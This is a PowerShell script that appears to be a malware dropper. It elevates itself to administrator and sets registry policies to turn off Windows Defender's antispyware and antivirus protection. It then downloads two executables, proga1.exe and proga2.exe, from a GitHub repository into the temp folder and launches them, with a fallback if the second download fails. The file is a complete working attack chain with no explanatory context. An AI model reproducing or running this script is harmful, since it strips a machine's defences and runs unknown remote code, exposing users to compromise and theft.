Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# Disable Windows Defender
$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiSpyware" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "DisableAntiVirus" -Value "1" -PropertyType Dword -Force

Write-Host "Windows Defender DISABLED" -ForegroundColor Green

# Download files using curl.exe (работает всегда)
$temp = $env:TEMP

Write-Host "Downloading proga1.exe..." -ForegroundColor Yellow
curl.exe -L -o "$temp\proga1.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
if (Test-Path "$temp\proga1.exe") { 
    Write-Host "Running proga1.exe" -ForegroundColor Green
    Start-Process "$temp\proga1.exe"
} else { Write-Host "FAILED proga1.exe" -ForegroundColor Red }

Write-Host "Downloading proga2.exe..." -ForegroundColor Yellow
curl.exe -L -o "$temp\proga2.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
if (Test-Path "$temp\proga2.exe") { 
    Write-Host "Running proga2.exe" -ForegroundColor Green
    Start-Process "$temp\proga2.exe"
} else { 
    Write-Host "proga2.exe not found, using proga1.exe as fallback" -ForegroundColor Yellow
    Copy-Item "$temp\proga1.exe" "$temp\proga2.exe" -ErrorAction SilentlyContinue
    if (Test-Path "$temp\proga2.exe") { Start-Process "$temp\proga2.exe" }
}

Write-Host "ALL DONE" -ForegroundColor Green
Pause
